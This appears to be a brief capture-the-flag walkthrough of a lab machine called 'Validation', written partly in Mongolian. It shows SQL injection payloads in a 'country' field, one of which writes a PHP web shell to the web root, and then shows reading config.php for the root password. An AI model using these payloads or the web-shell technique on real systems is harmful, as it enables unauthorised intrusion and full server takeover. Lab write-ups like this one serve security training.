# Validation - SQL Injection | config.php

## Identity SQL injection

**Single quote** явуулаад алдааны мессэж авсны дараа Column-ий тоог олж байна.

```http
username=adad&country=Brazil' union select 1-- -
```

**Union select-ээр** `cmd.php`-г upload хийж байна.

```http
username=adad&country=Brazil' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/cmd.php'-- -
```

[image]

## Shell as Root

[image]

**Reaching root pw in config.php**

```bash
cat /var/www/html/config.php
```

[image]

## Root!

[image]
